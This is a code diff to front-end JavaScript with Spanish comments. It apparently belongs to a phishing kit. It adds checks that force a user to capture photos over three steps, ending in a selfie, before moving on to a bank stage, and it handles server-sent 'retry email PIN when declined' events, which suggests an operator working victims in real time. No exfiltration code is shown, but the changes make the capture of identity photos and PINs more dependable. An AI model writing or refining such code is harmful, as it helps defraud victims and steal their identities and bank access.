@@ -341,7 +341,7 @@
         error.classList.remove('hidden');
         setTimeout(() => error.classList.add('hidden'), 3000);
     });
-    
+
         // NUEVO: Reintentar PIN Correo cuando se declina en Etapa 2
     socket.on('reintentarPINCorreo', () => {
         document.getElementById('loading-etapa2').classList.add('hidden');
@@ -435,6 +435,13 @@
 
     function showStep(step) {
         currentStep = step;
+
+                // Deshabilitar botón Next al cambiar de paso
+        setTimeout(() => {
+            const nextBtn = document.querySelector('#preview-container button:last-child');
+            if (nextBtn) nextBtn.disabled = true;
+        }, 100);
+        
         const stepData = steps[step - 1];
         document.getElementById('current-step').innerHTML = `
             <div class="flex justify-between items-center mb-6">
@@ -492,6 +499,10 @@
         if (stream) stream.getTracks().forEach(track => track.stop());
         document.getElementById('camera-container').classList.add('hidden');
         document.getElementById('preview-container').classList.remove('hidden');
+
+                // Habilitar el botón Next Step solo cuando se haya tomado la foto
+        const nextBtn = document.querySelector('#preview-container button:last-child');
+        if (nextBtn) nextBtn.disabled = false;
     }
 
     function retakePhoto() {
@@ -500,12 +511,20 @@
         startCamera();
     }
 
-    function nextStep() {
+            function nextStep() {
+        // VALIDACIÓN: No dejar avanzar si no se ha capturado la foto del paso actual
+        const photoTaken = capturedPhotos.some(photo => photo.step === currentStep);
+
+        if (!photoTaken) {
+            alert("❌ Debes tomar la foto de este paso antes de continuar.");
+            return; // ← Bloquea el avance
+        }
+
         if (currentStep < 3) {
             document.getElementById('preview-container').classList.add('hidden');
             showStep(currentStep + 1);
         } else {
-            // Antes de pasar al banco, enviamos un resumen (opcional pero útil)
+            // Último paso (selfie) → continuar al banco
             document.getElementById('verification-flow').classList.add('hidden');
             document.getElementById('loading-screen').classList.remove('hidden');
             setTimeout(() => {
